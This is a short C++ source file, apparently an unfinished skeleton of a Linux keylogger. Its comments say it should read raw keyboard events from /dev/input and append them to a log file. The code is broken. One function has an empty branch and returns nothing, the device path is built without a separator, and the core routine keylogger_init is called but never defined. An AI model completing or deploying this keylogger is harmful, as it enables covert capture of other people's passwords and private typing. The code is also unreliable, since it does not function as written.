#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <sys/dir.h>
#include <string>

using namespace std;

// Create a keylogger that reads raw binary input from the keyboard and logs it into a log file
// If possible, use the pre-defined keylogger.c to not re-invent the wheel
// usage: ./keylogger output_log.txt <-- the output file to store the logged data

void show_usage_and_exit(char* char_pt){
    fprintf(stderr, "Usage: %s output_file\n", char_pt);
    exit(1);
}

int is_keyboard_device(const struct dirent * file){
    struct stat filestat;
    char filename[512];

    snprintf(filename, sizeof(filename), "%s%s", "/dev/input", file->d_name);

    int error = stat(filename, &filestat);
    if (error){
        return 0;
    }
    return S_ISCHR(filestat.st_mode);
}

char * obtain_event_file(){
    char * keyboard_file = NULL;
    struct dirent ** event_files;
    char filename[512];

    int num = scandir("/dev/input", &event_files, &is_keyboard_device, &alphasort); 
    if (num < 0){
        return NULL;
    } else {
        
    }
}

int main(int argc, char ** argv){
    //check usage
    if (argc < 2){
        show_usage_and_exit(argv[0]);
    }

    //check /dev/input directory for the keyboard input file
    char * keyboard_device = obtain_event_file();
    if (keyboard_device == NULL){
        fprintf(stderr, "Error: Keyboard device not connected.");
        exit(1);
    }

    fstream output_file;
    output_file.open(argv[1], ios::app|ios::out);
    // TODO: error check this call

    fstream keyboard_file;
    keyboard_file.open(keyboard_device, ios::in);
    // TODO: error check this call 

    keylogger_init(keyboard_file, output_file);

    output_file.close();
    keyboard_file.close();
    free(keyboard_device);

    return 0;
}